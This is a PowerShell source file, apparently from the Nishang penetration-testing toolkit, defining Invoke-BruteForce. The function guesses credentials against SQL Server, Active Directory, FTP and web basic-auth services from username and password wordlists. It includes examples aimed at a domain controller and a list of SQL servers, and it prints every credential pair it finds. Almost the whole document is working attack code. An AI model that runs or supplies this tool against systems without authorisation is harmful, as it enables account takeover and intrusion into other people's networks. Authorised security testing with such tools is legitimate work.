
function Invoke-BruteForce
{
  <#
.SYNOPSIS
Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.

.DESCRIPTION
This payload can brute force credentials for SQL Server, ActiveDirectory, Web or FTP.

.PARAMETER Computername
Specifies a SQL Server, Domain, FTP Site or Web Site.

.PARAMETER UserList
Specify a list of users. If blank, trusted connection will be used for SQL and an error will be genrated for other services.

.PARAMETER PasswordList
Specify a list of passwords.

.PARAMETER Service
Enter a Service from SQL, ActiveDirecotry, FTP and Web. Default service is set to SQL.

.PARAMETER StopOnSuccess
Use this switch to stop the brute forcing on the first success.

.EXAMPLE
PS > Invoke-BruteForce -ComputerName SQLServ01 -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose
Brute force a SQL Server SQLServ01 for users listed in users.txt and passwords in wordlist.txt

.EXAMPLE
PS > Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose
Brute force a Domain Controller of targetdomain.com for users listed in users.txt and passwords in wordlist.txt.
Since StopOnSuccess is specified, the brute forcing stops on first success.

.EXAMPLE
PS > cat C:\test\servers.txt | Invoke-BruteForce -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose
Brute force SQL Service on all the servers specified in servers.txt

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
https://github.com/samratashok/nishang

.NOTES
Goude 2012, TreuSec
#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline=$true)]
        [Alias("PSComputerName","CN","MachineName","IP","IPAddress","Identity","Url","Ftp","Domain","DistinguishedName")]
        [String]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $UserList,

        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $PasswordList,

        [Parameter(Position = 3, Mandatory = $false)] [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
        [String]
        $Service = "SQL",

        [Parameter(Position = 4, Mandatory = $false)]
        [Switch]
        $StopOnSuccess
    )

    Process
    {
        $usernames = Get-Content $UserList
        $passwords = Get-Content $PasswordList
        #Brute force SQL Server
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        function CheckForSQLSuccess
        {
            Try
            {
                $Connection.Open()
                $success = $true
            }
            Catch
            {
                $success = $false
            }
            if($success -eq $true)
            {
                Write-Output "Match found! $username : $Password"
                switch ($connection.ServerVersion) {
                    { $_ -match "^6" } { "SQL Server 6.5";Break UsernameLoop }
                    { $_ -match "^7" } { "SQL Server 7";Break UsernameLoop }
                    { $_ -match "^8" } { "SQL Server 2000";Break UsernameLoop }
                    { $_ -match "^9" } { "SQL Server 2005";Break UsernameLoop }
                    { $_ -match "^10\.00" } { "SQL Server 2008";Break UsernameLoop }
                    { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break UsernameLoop }
                    { $_ -match "^11" } { "SQL Server 2012";Break UsernameLoop }
                    { $_ -match "^12" } { "SQL Server 2014";Break UsernameLoop }
                    { $_ -match "^13" } { "SQL Server 2016";Break UsernameLoop }
                    Default { "Unknown" }
                }
            }
        }
        if($service -eq "SQL")
        {
            Write-Output "Brute Forcing SQL Service on $ComputerName"
            if($userList)
            {
                :UsernameLoop foreach ($username in $usernames)
                {
                    foreach ($Password in $Passwords)
                    {
                        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
                        Write-Verbose "Checking $userName : $password"
                        CheckForSQLSuccess
                    }
                }
            }
            else
            {
                #If no username is provided, use trusted connection
                $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
                CheckForSQLSuccess

            }
        }

        #Brute Force FTP
        elseif ($service -eq "FTP")
        {
            if($ComputerName -notMatch "^ftp://")
            {
                $source = "ftp://" + $ComputerName
            }
            else
            {
                $source = $ComputerName
            }
            Write-Output "Brute Forcing FTP on $ComputerName"

            :UsernameLoop foreach ($username in $usernames)
            {
                foreach ($Password in $Passwords)
                {
                    try
                    {
                        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
                        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
                        Write-Verbose "Checking $userName : $password"
                        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
                        $result = $ftpRequest.GetResponse()
                        $message = $result.BannerMessage + $result.WelcomeMessage
                        Write-Output "Match found! $username : $Password"
                        $success = $true
                        if ($StopOnSuccess)
                        {
                            break UsernameLoop
                        }
                    }

                    catch
                    {
                        $message = $error[0].ToString()
                        $success = $false
                    }
                }
            }
        }

        #Brute Force Active Directory
        elseif ($service -eq "ActiveDirectory")
        {
            Write-Output "Brute Forcing Active Directory $ComputerName"
            Add-Type -AssemblyName System.DirectoryServices.AccountManagement
            $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
            Try
            {
                $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)
                $success = $true
            }
            Catch
            {
                $message = "Unable to contact Domain"
                $success = $false
            }
            if($success -ne $false)
            {
                :UsernameLoop foreach ($username in $usernames)
                {
                    foreach ($Password in $Passwords)
                    {
                        Try
                        {
                            Write-Verbose "Checking $userName : $password"
                            $success = $principalContext.ValidateCredentials($username, $password)
                            $message = "Password Match"
                            if ($success -eq $true)
                            {
                                Write-Output "Match found! $username : $Password"
                                if ($StopOnSuccess)
                                {
                                    break UsernameLoop
                                }
                            }
                        }
                        Catch
                        {
                            $success = $false
                            $message = "Password doesn't match"
                        }
                    }
                }
            }
        }
        #Brute Force Web
        elseif ($service -eq "Web")
        {
            if ($ComputerName -notMatch "^(http|https)://")
            {
                $source = "http://" + $ComputerName
            }
            else
            {
                $source = $ComputerName
            }
            :UsernameLoop foreach ($username in $usernames)
            {
                foreach ($Password in $Passwords)
                {
                    $webClient = New-Object Net.WebClient
                    $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
                    $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
                    $webClient.Credentials = $credential
                    Try
                    {
                        Write-Verbose "Checking $userName : $password"
                        $source
                        $webClient.DownloadString($source)
                        $success = $true
                        $success
                        if ($success -eq $true)
                        {
                            Write-Output "Match found! $Username : $Password"
                            if ($StopOnSuccess)
                            {
                                break UsernameLoop
                            }
                        }
                    }
                    Catch
                    {
                        $success = $false
                        $message = "Password doesn't match"
                    }
                }
            }
        }
    }
}
